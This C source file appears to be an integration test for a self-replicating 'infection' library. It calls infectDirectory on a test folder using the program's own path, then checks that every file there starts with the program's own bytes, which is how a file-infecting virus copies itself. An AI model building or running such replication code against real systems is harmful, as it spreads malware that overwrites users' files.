#include "../../client/common/clonelib.h"
#include "../../client/common/common.h"
#include "../../client/common/os.h"
#include <stdio.h>
#include <stdlib.h>
#define TEST_DIR "./infection_test"

int main(int argc, char **argv)
{
	argc = argc;
	printf("Beginning Infection Integration Test...\n\n");

	//Infect directory
	printf("Infecting directory (" TEST_DIR "):\n");
	int infection_status = infectDirectory(TEST_DIR, argv[0]);
	printf("Status: %s\n", infection_status ? "OK" : "Failed");
	printf("\n");

	//Read own bytes
	printf("Reading own bytes\n");
	char *own_bytes;
	int own_bytes_length = getOwnBytes(&own_bytes, argv[0]);
	printf("Byte length:%d\n", own_bytes_length);
	printf("\n");

	//Get list of directories
	char **ls = walkDir(TEST_DIR);

	//Compare with each filelength
	printf("Comparing...\n");
	FILE *fp;
	char *fp_bytes = (char *) malloc(own_bytes_length);
	for (int i = 0; (ls[i])[0] != '\0'; i++) {
		fp = fopen(ls[i], "rb");
		fread(fp_bytes, 1, own_bytes_length, fp);
		printf("Checking %s...", ls[i]);
		for (int j = 0; j < own_bytes_length; j++) {

			if (fp_bytes[j] != own_bytes[j]) {
				printf("failed(%c!=%c) - ", fp_bytes[j],
				       own_bytes[j]);
				printf("@ %d", j);
				break;
			}
		}
		printf("\n");

	}

	free(fp_bytes);
	free(own_bytes);
	printf("\n");
	return 0;
}
